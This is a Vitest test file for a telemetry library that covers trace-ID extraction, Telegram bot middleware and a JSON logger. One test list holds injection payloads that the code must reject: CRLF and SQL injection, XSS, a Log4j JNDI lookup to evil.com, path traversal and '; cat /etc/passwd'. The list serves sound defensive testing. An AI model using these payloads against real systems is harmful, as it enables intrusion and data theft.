import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import {
  extractTelegramActor,
  resolveTelegramActionTrigger,
  telemetryMiddleware,
} from '../src/adapters/grammy.js';
import {
  createTraceHeaders,
  deriveIncidentCode,
  extractTraceId,
} from '../src/adapters/next.js';
import { W3C_TRACEPARENT_REGEX } from '../src/constants.js';
import { getTelemetryContext, getTraceId } from '../src/context.js';
import { TelemetryLogger } from '../src/logger.js';
import type { TelegramStructuralContext } from '../src/types.js';

const PINNED_BASE_TIME = new Date('2026-09-21T12:00:00.000Z');

describe('Challenger M1-2 Empirical Stress Harness', () => {
  let stdoutSpy: any;
  let stderrSpy: any;

  beforeEach(() => {
    vi.useFakeTimers({ toFake: ['Date'] });
    vi.setSystemTime(PINNED_BASE_TIME);
    vi.spyOn(console, 'log').mockImplementation(() => {});
    vi.spyOn(console, 'info').mockImplementation(() => {});
    vi.spyOn(console, 'warn').mockImplementation(() => {});
    vi.spyOn(console, 'error').mockImplementation(() => {});
    stdoutSpy = vi.spyOn(process.stdout, 'write').mockImplementation(() => true);
    stderrSpy = vi.spyOn(process.stderr, 'write').mockImplementation(() => true);
  });

  afterEach(() => {
    vi.restoreAllMocks();
    vi.useRealTimers();
  });

  // --------------------------------------------------------------------------
  // 1. Next.js Adapter Stress Tests
  // --------------------------------------------------------------------------
  describe('adapters/next.ts: extractTraceId stress testing', () => {
    const UUID_REGEX = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;

    describe('Query parameters', () => {
      it('extracts valid traceId from query param', () => {
        // Arrange
        const req = { url: 'https://dashboard.alsaada.com/admin?traceId=valid-trace-123' };

        // Act
        const traceId = extractTraceId(req);

        // Assert
        expect(traceId).toBe('valid-trace-123');
      });

      it('extracts valid snake_case trace_id from query param', () => {
        // Arrange
        const req = { url: 'https://dashboard.alsaada.com/admin?trace_id=valid-trace-456' };

        // Act
        const traceId = extractTraceId(req);

        // Assert
        expect(traceId).toBe('valid-trace-456');
      });

      it('prefers traceId over trace_id when both are present', () => {
        // Arrange
        const req = {
          url: 'https://dashboard.alsaada.com/admin?traceId=preferred-trace-111&trace_id=secondary-trace-222',
        };

        // Act
        const traceId = extractTraceId(req);

        // Assert
        expect(traceId).toBe('preferred-trace-111');
      });

      it('prefers query param over x-trace-id header when both are present', () => {
        // Arrange
        const req = {
          url: 'https://dashboard.alsaada.com/admin?traceId=query-trace-999',
          headers: { 'x-trace-id': 'header-trace-888' },
        };

        // Act
        const traceId = extractTraceId(req);

        // Assert
        expect(traceId).toBe('query-trace-999');
      });

      it('gracefully handles unparseable or relative URLs without throwing', () => {
        // Arrange
        const req1 = { url: '/relative/path?traceId=rel-trace-123' };
        const req2 = { url: 'http://localhost:3002/%E0%A4%A' };

        // Act
        const traceId1 = extractTraceId(req1);
        const traceId2 = extractTraceId(req2);

        // Assert
        expect(traceId1).toBe('rel-trace-123');
        expect(traceId2).toMatch(UUID_REGEX);
      });
    });

    describe('HTTP Headers extraction', () => {
      it('extracts x-trace-id from Headers Web API instance', () => {
        // Arrange
        const headers = new Headers();
        headers.set('x-trace-id', 'web-api-trace-id-123');

        // Act
        const traceId = extractTraceId({ headers });

        // Assert
        expect(traceId).toBe('web-api-trace-id-123');
      });

      it('extracts from case variants in plain object: x-trace-id, X-Trace-Id, x_trace_id', () => {
        // Arrange
        const req1 = { headers: { 'x-trace-id': 'case-1-trace-id' } };
        const req2 = { headers: { 'X-Trace-Id': 'case-2-trace-id' } };
        const req3 = { headers: { 'x_trace_id': 'case-3-trace-id' } };

        // Act
        const res1 = extractTraceId(req1);
        const res2 = extractTraceId(req2);
        const res3 = extractTraceId(req3);

        // Assert
        expect(res1).toBe('case-1-trace-id');
        expect(res2).toBe('case-2-trace-id');
        expect(res3).toBe('case-3-trace-id');
      });

      it('extracts first element when header is passed as array of strings', () => {
        // Arrange
        const req = {
          headers: {
            'x-trace-id': ['array-trace-first', 'array-trace-second'],
          },
        };

        // Act
        const traceId = extractTraceId(req);

        // Assert
        expect(traceId).toBe('array-trace-first');
      });
    });

    describe('Injection and malformed string rejection', () => {
      const INJECTION_ATTEMPTS = [
        'valid-id\r\nX-Injected-Header: evil', // CRLF injection
        'valid-id\nSet-Cookie: session=evil', // LF injection
        "'; DROP TABLE users; --", // SQL injection
        "' OR '1'='1", // SQL boolean injection
        '<script>alert("XSS")</script>', // XSS script injection
        '${jndi:ldap://evil.com/a}', // Log4j / template injection
        '../../../../etc/passwd', // Path traversal
        '; cat /etc/passwd', // Command injection
        'null', // Too short (< 8 chars)
        'abc', // Too short
        '1234567', // 7 chars (boundary < 8)
        'a'.repeat(65), // 65 chars (boundary > 64)
        'has space between', // Spaces not allowed
        'has\tTabInside', // Control characters
        'has\0NullByte', // Null byte
        'invalid@char!', // Symbols not in [a-zA-Z0-9_-]
      ];

      for (const injection of INJECTION_ATTEMPTS) {
        it(`rejects query param injection: ${JSON.stringify(injection)}`, () => {
          // Arrange
          const req = {
            url: `https://dashboard.alsaada.com/admin?traceId=${encodeURIComponent(injection)}`,
          };

          // Act
          const extracted = extractTraceId(req);

          // Assert
          expect(extracted).not.toBe(injection);
          expect(extracted).toMatch(UUID_REGEX);
        });

        it(`rejects header injection: ${JSON.stringify(injection)}`, () => {
          // Arrange
          const req = {
            headers: { 'x-trace-id': injection },
          };

          // Act
          const extracted = extractTraceId(req);

          // Assert
          expect(extracted).not.toBe(injection);
          expect(extracted).toMatch(UUID_REGEX);
        });
      }
    });

    describe('W3C traceparent extraction', () => {
      it('correctly extracts and formats 32-hex traceId into UUID from standard W3C header', () => {
        // Arrange
        const req = {
          headers: {
            traceparent: '00-4bf92f3577b34da6a3ce929d0e0e4736-00f067aa0ba902b7-01',
          },
        };

        // Act
        const traceId = extractTraceId(req);

        // Assert
        expect(traceId).toBe('4bf92f35-77b3-4da6-a3ce-929d0e0e4736');
      });

      it('handles uppercase hex in W3C traceparent', () => {
        // Arrange
        const req = {
          headers: {
            traceparent: '00-4BF92F3577B34DA6A3CE929D0E0E4736-00F067AA0BA902B7-01',
          },
        };

        // Act
        const traceId = extractTraceId(req);

        // Assert
        expect(traceId).toBe('4BF92F35-77B3-4DA6-A3CE-929D0E0E4736');
      });

      it('trims leading/trailing whitespace around W3C traceparent', () => {
        // Arrange
        const req = {
          headers: {
            traceparent: '  00-4bf92f3577b34da6a3ce929d0e0e4736-00f067aa0ba902b7-01  ',
          },
        };

        // Act
        const traceId = extractTraceId(req);

        // Assert
        expect(traceId).toBe('4bf92f35-77b3-4da6-a3ce-929d0e0e4736');
      });

      it('falls back to UUID when W3C version is not 00', () => {
        // Arrange
        const req = {
          headers: {
            traceparent: '01-4bf92f3577b34da6a3ce929d0e0e4736-00f067aa0ba902b7-01',
          },
        };

        // Act
        const traceId = extractTraceId(req);

        // Assert
        expect(traceId).toMatch(UUID_REGEX);
      });

      it('falls back to UUID when trace ID in traceparent is not 32-hex chars', () => {
        // Arrange
        const req1 = {
          headers: {
            traceparent: '00-4bf92f3577b34da6a3ce929d0e0e473-00f067aa0ba902b7-01',
          },
        };
        const req2 = {
          headers: {
            traceparent: '00-4bf92f3577b34da6a3ce929d0e0e4736a-00f067aa0ba902b7-01',
          },
        };

        // Act
        const traceId1 = extractTraceId(req1);
        const traceId2 = extractTraceId(req2);

        // Assert
        expect(traceId1).toMatch(UUID_REGEX);
        expect(traceId2).toMatch(UUID_REGEX);
      });

      it('falls back to UUID when traceparent contains non-hex characters', () => {
        // Arrange
        const req = {
          headers: {
            traceparent: '00-4bf92f3577b34da6a3ce929d0e0e473g-00f067aa0ba902b7-01',
          },
        };

        // Act
        const traceId = extractTraceId(req);

        // Assert
        expect(traceId).toMatch(UUID_REGEX);
      });
    });

    describe('Fallback UUID generation', () => {
      it('generates distinct, valid RFC 4122 UUIDv4 on consecutive fallbacks', () => {
        // Arrange
        const emptyReq = {};
        const emptyHeadersReq = { headers: {} };

        // Act
        const id1 = extractTraceId(emptyReq);
        const id2 = extractTraceId(emptyReq);
        const id3 = extractTraceId(emptyHeadersReq);

        // Assert
        expect(id1).toMatch(UUID_REGEX);
        expect(id2).toMatch(UUID_REGEX);
        expect(id3).toMatch(UUID_REGEX);
        expect(id1).not.toBe(id2);
        expect(id2).not.toBe(id3);
      });
    });
  });

  describe('adapters/next.ts: createTraceHeaders format & W3C compliance', () => {
    it('creates headers with exact x-trace-id and W3C compliant traceparent', () => {
      // Arrange
      const traceId = '4a7c8b21-d3e5-f7a9-0b1c-2d3e4f5a6b7c';

      // Act
      const headers = createTraceHeaders(traceId);

      // Assert
      expect(headers['x-trace-id']).toBe(traceId);
      expect(headers['traceparent']).toBeDefined();
      expect(W3C_TRACEPARENT_REGEX.test(headers['traceparent']!)).toBe(true);
      expect(headers['traceparent']).toBe('00-4a7c8b21d3e5f7a90b1c2d3e4f5a6b7c-0000000000000001-01');
    });

    it('uses custom parentSpanId and sanitizes non-hex characters', () => {
      // Arrange
      const traceId = '4a7c8b21-d3e5-f7a9-0b1c-2d3e4f5a6b7c';
      const customSpan = 'xyz-fedcba9876543210';

      // Act
      const headers = createTraceHeaders(traceId, customSpan);

      // Assert
      expect(headers['traceparent']).toBe('00-4a7c8b21d3e5f7a90b1c2d3e4f5a6b7c-fedcba9876543210-01');
      expect(W3C_TRACEPARENT_REGEX.test(headers['traceparent']!)).toBe(true);
    });

    it('pads short traceId and spanId with zeros to guarantee 32 and 16 hex length', () => {
      // Arrange
      const shortTrace = 'abc';
      const shortSpan = '123';

      // Act
      const headers = createTraceHeaders(shortTrace, shortSpan);

      // Assert
      expect(headers['traceparent']).toBe(
        '00-abc00000000000000000000000000000-1230000000000000-01'
      );
      expect(W3C_TRACEPARENT_REGEX.test(headers['traceparent']!)).toBe(true);
    });

    it('truncates traceId and spanId longer than 32/16 hex chars', () => {
      // Arrange
      const longTrace = 'a'.repeat(40);
      const longSpan = 'b'.repeat(25);

      // Act
      const headers = createTraceHeaders(longTrace, longSpan);

      // Assert
      expect(headers['traceparent']).toBe(
        `00-${'a'.repeat(32)}-${'b'.repeat(16)}-01`
      );
      expect(W3C_TRACEPARENT_REGEX.test(headers['traceparent']!)).toBe(true);
    });
  });

  describe('adapters/next.ts: deriveIncidentCode format', () => {
    it('derives TRC-{8_UPPERCASE_CHARS} by default', () => {
      // Arrange
      const id1 = '4a7c8b21-d3e5-f7a9-0b1c-2d3e4f5a6b7c';
      const id2 = '9b1deb4d-1111-2222-3333-444455556666';

      // Act
      const code1 = deriveIncidentCode(id1);
      const code2 = deriveIncidentCode(id2);

      // Assert
      expect(code1).toBe('TRC-4A7C8B21');
      expect(code2).toBe('TRC-9B1DEB4D');
    });

    it('supports custom prefix (e.g. ERR, ALERT)', () => {
      // Arrange
      const id = '4a7c8b21-d3e5-f7a9';

      // Act
      const errCode = deriveIncidentCode(id, 'ERR');
      const critCode = deriveIncidentCode(id, 'CRIT');

      // Assert
      expect(errCode).toBe('ERR-4A7C8B21');
      expect(critCode).toBe('CRIT-4A7C8B21');
    });

    it('strips non-alphanumeric characters from token calculation', () => {
      // Arrange
      const messyId = '---ab-cd-ef-12---';

      // Act
      const code = deriveIncidentCode(messyId);

      // Assert
      expect(code).toBe('TRC-ABCDEF12');
    });

    it('handles traceId with fewer than 8 alphanumeric characters gracefully', () => {
      // Arrange
      const shortId = 'abc12';

      // Act
      const code = deriveIncidentCode(shortId);

      // Assert
      expect(code).toBe('TRC-ABC12');
    });

    it('falls back to UNKNOWN when traceId has no alphanumeric characters', () => {
      // Arrange
      const emptyId = '';
      const symbolOnlyId = '-----____';

      // Act
      const codeEmpty = deriveIncidentCode(emptyId);
      const codeSymbols = deriveIncidentCode(symbolOnlyId);

      // Assert
      expect(codeEmpty).toBe('TRC-UNKNOWN');
      expect(codeSymbols).toBe('TRC-UNKNOWN');
    });
  });

  // --------------------------------------------------------------------------
  // 2. grammY Adapter Stress Tests
  // --------------------------------------------------------------------------
  describe('adapters/grammy.ts: action trigger & actor resolution', () => {
    describe('resolveTelegramActionTrigger', () => {
      it('resolves commands correctly', () => {
        // Arrange
        const update1 = { message: { text: '/start' } };
        const update2 = { message: { text: '/dashboard site_alpha' } };
        const update3 = { message: { text: '  /settings  ' } };

        // Act
        const res1 = resolveTelegramActionTrigger(update1);
        const res2 = resolveTelegramActionTrigger(update2);
        const res3 = resolveTelegramActionTrigger(update3);

        // Assert
        expect(res1).toBe('cmd:/start');
        expect(res2).toBe('cmd:/dashboard');
        expect(res3).toBe('cmd:/settings');
      });

      it('resolves and truncates plain text messages at 35 chars', () => {
        // Arrange
        const longText = 'This is an extremely long message that will definitely be truncated by the telemetry engine';

        // Act
        const result = resolveTelegramActionTrigger({ message: { text: longText } });

        // Assert
        expect(result).toBe(`msg:${longText.slice(0, 35)}`);
      });

      it('resolves media updates', () => {
        // Arrange
        const docUpdate = { message: { document: { file_id: 'doc1' } } };
        const photoUpdate = { message: { photo: [{ file_id: 'photo1' }] } };
        const locUpdate = { message: { location: { latitude: 30.0, longitude: 31.0 } } };

        // Act
        const docRes = resolveTelegramActionTrigger(docUpdate);
        const photoRes = resolveTelegramActionTrigger(photoUpdate);
        const locRes = resolveTelegramActionTrigger(locUpdate);

        // Assert
        expect(docRes).toBe('doc:upload');
        expect(photoRes).toBe('photo:upload');
        expect(locRes).toBe('loc:share');
      });

      it('resolves callback queries with and without data', () => {
        // Arrange
        const cbWithData = { callbackQuery: { data: 'advance:approve:42' } };
        const cbWithoutData = { callbackQuery: {} };

        // Act
        const resWithData = resolveTelegramActionTrigger(cbWithData);
        const resWithoutData = resolveTelegramActionTrigger(cbWithoutData);

        // Assert
        expect(resWithData).toBe('cb:advance:approve:42');
        expect(resWithoutData).toBe('unknown_update');
      });

      it('returns unknown_update for unhandled or empty update types', () => {
        // Arrange
        const emptyUpdate = {};
        const inlineUpdate = { inlineQuery: { query: 'search' } } as any;

        // Act
        const resEmpty = resolveTelegramActionTrigger(emptyUpdate);
        const resInline = resolveTelegramActionTrigger(inlineUpdate);

        // Assert
        expect(resEmpty).toBe('unknown_update');
        expect(resInline).toBe('unknown_update');
      });
    });

    describe('extractTelegramActor', () => {
      it('extracts complete actor with role, id, and assignedSiteId', () => {
        // Arrange
        const ctx: TelegramStructuralContext = {
          from: { id: 7594239391 },
          effectiveRole: 'ACCOUNTANT',
          dbUser: {
            id: 'db-user-uuid',
            role: 'AUDITOR',
            assignedSiteId: 'site-delta',
          },
        };

        // Act
        const actor = extractTelegramActor(ctx);

        // Assert
        expect(actor.telegramId).toBe('7594239391');
        expect(actor.role).toBe('ACCOUNTANT');
        expect(actor.userId).toBe('db-user-uuid');
        expect(actor.siteId).toBe('site-delta');
      });

      it('handles BigInt from.id cleanly', () => {
        // Arrange
        const ctx: TelegramStructuralContext = {
          from: { id: 999888777666555n as any },
        };

        // Act
        const actor = extractTelegramActor(ctx);

        // Assert
        expect(actor.telegramId).toBe('999888777666555');
        expect(actor.role).toBe('GUEST');
      });
    });
  });

  describe('adapters/grammy.ts: telemetryMiddleware lifecycle and exceptions', () => {
    it('establishes traceId, executes inside AsyncLocalStorage, and propagates to next()', async () => {
      // Arrange
      const onBreadcrumb = vi.fn();
      const onPerformance = vi.fn();

      const middleware = telemetryMiddleware({
        service: 'bot-stress-test',
        component: 'bot:stress',
        onBreadcrumb,
        onPerformance,
      });

      const fakeCtx: TelegramStructuralContext = {
        from: { id: 7594239391 },
        message: { text: '/workforce' },
      };

      let observedTraceId: string | undefined;
      let observedContext: unknown;

      // Act
      await middleware(fakeCtx as any, async () => {
        observedTraceId = getTraceId();
        observedContext = getTelemetryContext();
      });

      // Assert
      expect(fakeCtx.traceId).toBeDefined();
      expect(observedTraceId).toBe(fakeCtx.traceId);
      expect(observedContext).toMatchObject({
        traceId: fakeCtx.traceId,
        service: 'bot-stress-test',
        component: 'bot:stress',
        action: 'cmd:/workforce',
        actor: {
          telegramId: '7594239391',
          role: 'GUEST',
        },
      });

      expect(onBreadcrumb).toHaveBeenCalledWith(7594239391n, 'cmd:/workforce');
      expect(onPerformance).toHaveBeenCalledWith(
        expect.objectContaining({
          actorTelegramId: 7594239391n,
          action: 'cmd:/workforce',
          executionTimeMs: expect.any(Number),
          error: undefined,
        })
      );
    });

    it('re-throws standard Error, logs structured error, and calls onPerformance with error', async () => {
      // Arrange
      const onPerformance = vi.fn();
      const middleware = telemetryMiddleware({
        service: 'bot-error-test',
        onPerformance,
      });

      const fakeCtx: TelegramStructuralContext = {
        from: { id: 7594239391 },
        message: { text: 'cause-failure' },
      };

      const testError = new Error('Database connection timed out');

      // Act
      let caughtError: unknown;
      try {
        await middleware(fakeCtx as any, async () => {
          throw testError;
        });
      } catch (err) {
        caughtError = err;
      }

      // Assert
      expect(caughtError).toBe(testError);
      expect(stderrSpy).toHaveBeenCalled();
      const loggedLine = stderrSpy.mock.calls[0]?.[0] as string;
      expect(loggedLine).toBeDefined();

      const parsedLog = JSON.parse(loggedLine);
      expect(parsedLog.level).toBe('error');
      expect(parsedLog.message).toBe('Database connection timed out');
      expect(parsedLog.traceId).toBe(fakeCtx.traceId);
      expect(parsedLog.error.name).toBe('Error');
      expect(parsedLog.error.message).toBe('Database connection timed out');

      expect(onPerformance).toHaveBeenCalledWith(
        expect.objectContaining({
          actorTelegramId: 7594239391n,
          action: 'msg:cause-failure',
          error: testError,
        })
      );
    });

    it('handles non-Error thrown values (strings, objects) without crashing', async () => {
      // Arrange
      const onPerformance = vi.fn();
      const middleware = telemetryMiddleware({ onPerformance });

      const fakeCtx: TelegramStructuralContext = {
        from: { id: 11223344 },
        message: { text: 'string-error' },
      };

      // Act
      let thrownValue: unknown;
      try {
        await middleware(fakeCtx as any, async () => {
          // eslint-disable-next-line @typescript-eslint/no-throw-literal
          throw 'Non-error string thrown';
        });
      } catch (err) {
        thrownValue = err;
      }

      // Assert
      expect(thrownValue).toBe('Non-error string thrown');
      expect(stderrSpy).toHaveBeenCalled();
      const loggedLine = stderrSpy.mock.calls[0]?.[0] as string;
      const parsedLog = JSON.parse(loggedLine);
      expect(parsedLog.level).toBe('error');
      expect(parsedLog.message).toBe('Non-error string thrown');

      expect(onPerformance).toHaveBeenCalledWith(
        expect.objectContaining({
          error: 'Non-error string thrown',
        })
      );
    });

    it('swallows errors from onBreadcrumb without interrupting next()', async () => {
      // Arrange
      const throwingBreadcrumb = vi.fn(async () => {
        throw new Error('Breadcrumb store failed');
      });

      const middleware = telemetryMiddleware({
        onBreadcrumb: throwingBreadcrumb,
      });

      const fakeCtx: TelegramStructuralContext = {
        from: { id: 7594239391 },
        message: { text: '/ok' },
      };

      let nextCalled = false;

      // Act
      await middleware(fakeCtx as any, async () => {
        nextCalled = true;
      });

      // Assert
      expect(throwingBreadcrumb).toHaveBeenCalled();
      expect(nextCalled).toBe(true);
    });

    it('swallows errors from onPerformance without masking primary error', async () => {
      // Arrange
      const throwingPerformance = vi.fn(async () => {
        throw new Error('APM recording failed');
      });

      const middleware = telemetryMiddleware({
        onPerformance: throwingPerformance,
      });

      const fakeCtx: TelegramStructuralContext = {
        from: { id: 7594239391 },
        message: { text: '/fail' },
      };

      // Act
      let caughtError: unknown;
      try {
        await middleware(fakeCtx as any, async () => {
          throw new Error('Primary Business Error');
        });
      } catch (err) {
        caughtError = err;
      }

      // Assert
      expect((caughtError as Error).message).toBe('Primary Business Error');
      expect(throwingPerformance).toHaveBeenCalled();
    });

    it('does not trigger onBreadcrumb or onPerformance for non-user IDs (negative channel IDs)', async () => {
      // Arrange
      const onBreadcrumb = vi.fn();
      const onPerformance = vi.fn();

      const middleware = telemetryMiddleware({
        onBreadcrumb,
        onPerformance,
      });

      const fakeCtx: TelegramStructuralContext = {
        from: { id: -1001234567890 as any }, // Channel / Supergroup negative ID
        message: { text: 'Channel announcement' },
      };

      // Act
      await middleware(fakeCtx as any, async () => {});

      // Assert
      expect(onBreadcrumb).not.toHaveBeenCalled();
      expect(onPerformance).not.toHaveBeenCalled();
    });
  });

  // --------------------------------------------------------------------------
  // 3. TelemetryLogger Stress Tests
  // --------------------------------------------------------------------------
  describe('TelemetryLogger: stream routing & JSON validity', () => {
    it('routes debug and info to stdout; warn, error, fatal to stderr', () => {
      // Arrange
      const logger = new TelemetryLogger({ minLevel: 'debug' });

      // Act
      logger.debug('debug-event');
      logger.info('info-event');

      // Assert
      expect(stdoutSpy).toHaveBeenCalledTimes(2);
      expect(stderrSpy).not.toHaveBeenCalled();

      // Act
      logger.warn('warn-event');
      logger.error('error-event');
      logger.fatal('fatal-event');

      // Assert
      expect(stdoutSpy).toHaveBeenCalledTimes(2);
      expect(stderrSpy).toHaveBeenCalledTimes(3);
    });

    it('strictly suppresses logs below minLevel', () => {
      // Arrange
      const logger = new TelemetryLogger({ minLevel: 'error' });

      // Act
      const debugRes = logger.debug('d');
      const infoRes = logger.info('i');
      const warnRes = logger.warn('w');

      // Assert
      expect(debugRes).toBeUndefined();
      expect(infoRes).toBeUndefined();
      expect(warnRes).toBeUndefined();
      expect(stdoutSpy).not.toHaveBeenCalled();
      expect(stderrSpy).not.toHaveBeenCalled();

      // Act
      const errRes = logger.error('e');
      const fatalRes = logger.fatal('f');

      // Assert
      expect(errRes).toBeDefined();
      expect(fatalRes).toBeDefined();
      expect(stderrSpy).toHaveBeenCalledTimes(2);
    });

    it('every emitted log line is valid JSON ending with a newline', () => {
      // Arrange
      const logger = new TelemetryLogger({ minLevel: 'debug' });

      // Act
      logger.debug('debug test');
      logger.info('info test');
      logger.warn('warn test');
      logger.error('error test');
      logger.fatal('fatal test');

      const allWritten = [
        ...stdoutSpy.mock.calls.map((c: any) => c[0] as string),
        ...stderrSpy.mock.calls.map((c: any) => c[0] as string),
      ];

      // Assert
      expect(allWritten.length).toBe(5);

      for (const line of allWritten) {
        expect(line.endsWith('\n')).toBe(true);
        const parsed = JSON.parse(line.trim());
        expect(parsed).toBeTypeOf('object');
        expect(parsed.timestamp).toBeDefined();
        expect(new Date(parsed.timestamp).toISOString()).toBe(parsed.timestamp);
        expect(parsed.traceId).toBeDefined();
        expect(parsed.service).toBeDefined();
        expect(parsed.environment).toBeDefined();
        expect(parsed.component).toBeDefined();
        expect(parsed.hostname).toBeDefined();
        expect(parsed.pid).toBeTypeOf('number');
      }
    });

    describe('Adversarial and complex payloads', () => {
      it('serializes payloads with BigInt safely without throwing', () => {
        // Arrange
        const logger = new TelemetryLogger();

        // Act
        const entry = logger.info('BigInt test', {
          payload: {
            workerId: 9007199254740993n,
            nested: {
              hugeAmount: 10000000000000000000n,
            },
          },
        });

        // Assert
        expect(entry).toBeDefined();
        const line = stdoutSpy.mock.calls[0]?.[0] as string;
        const parsed = JSON.parse(line);
        expect(parsed.payload.workerId).toBe('9007199254740993');
        expect(parsed.payload.nested.hugeAmount).toBe('10000000000000000000');
      });

      it('handles circular references in payload safely without infinite loops or crashes', () => {
        // Arrange
        const logger = new TelemetryLogger();
        const circularObj: any = { name: 'circular-root' };
        circularObj.self = circularObj;
        circularObj.nested = { back: circularObj };

        // Act
        const entry = logger.warn('Circular test', { payload: circularObj });

        // Assert
        expect(entry).toBeDefined();

        const line = stderrSpy.mock.calls[0]?.[0] as string;
        const parsed = JSON.parse(line);
        expect(parsed.payload.name).toBe('circular-root');
        expect(parsed.payload.self).toBe('[CIRCULAR_REFERENCE]');
        expect(parsed.payload.nested.back).toBe('[CIRCULAR_REFERENCE]');
      });

      it('enforces depth limit on deeply nested objects', () => {
        // Arrange
        const logger = new TelemetryLogger();
        let deep: any = { depth: 12 };
        for (let i = 11; i >= 0; i--) {
          deep = { level: i, child: deep };
        }

        // Act
        const entry = logger.info('Deep nesting test', { payload: deep });

        // Assert
        expect(entry).toBeDefined();

        const line = stdoutSpy.mock.calls[0]?.[0] as string;
        const parsed = JSON.parse(line);
        expect(JSON.stringify(parsed)).toContain('[MAX_DEPTH_REACHED]');
      });

      it('truncates oversized strings in payload', () => {
        // Arrange
        const logger = new TelemetryLogger();
        const hugeString = 'X'.repeat(15000);

        // Act
        const entry = logger.info('Oversized string', {
          payload: { content: hugeString },
        });

        // Assert
        expect(entry).toBeDefined();

        const line = stdoutSpy.mock.calls[0]?.[0] as string;
        const parsed = JSON.parse(line);
        expect(parsed.payload.content).toContain('... [TRUNCATED]');
        expect(parsed.payload.content.length).toBeLessThan(15000);
      });

      it('handles Arabic text, emojis, and special unicode without corruption', () => {
        // Arrange
        const logger = new TelemetryLogger();
        const arabicMsg = 'تم تسجيل السلفة بنجاح للعامل 👷‍♂️ أحمد محمد علي';
        const payload = {
          notes: 'ملاحظات الصرف المالي 💰: دفعة أولى من الراتب',
          code: 'سلفة_نقدية',
        };

        // Act
        const entry = logger.info(arabicMsg, { payload });

        // Assert
        expect(entry).toBeDefined();

        const line = stdoutSpy.mock.calls[0]?.[0] as string;
        const parsed = JSON.parse(line);
        expect(parsed.message).toBe(arabicMsg);
        expect(parsed.payload.notes).toBe(payload.notes);
        expect(parsed.payload.code).toBe(payload.code);
      });

      it('scrubs sensitive properties inside Error cause chains', () => {
        // Arrange
        const logger = new TelemetryLogger();
        const rootCause = new Error('Underlying database failure at postgresql://app_user:secretPass123@db.prod:5432/finance');
        const outerError = new Error('Service transaction failed', { cause: rootCause });

        // Act
        const entry = logger.error('Transaction failed', { error: outerError });

        // Assert
        expect(entry).toBeDefined();

        const line = stderrSpy.mock.calls[0]?.[0] as string;
        const parsed = JSON.parse(line);
        expect(parsed.error.cause).toBeDefined();
        expect(parsed.error.cause.message).toContain('[REDACTED_PASSWORD]');
        expect(parsed.error.cause.message).not.toContain('secretPass123');
      });
    });
  });
});
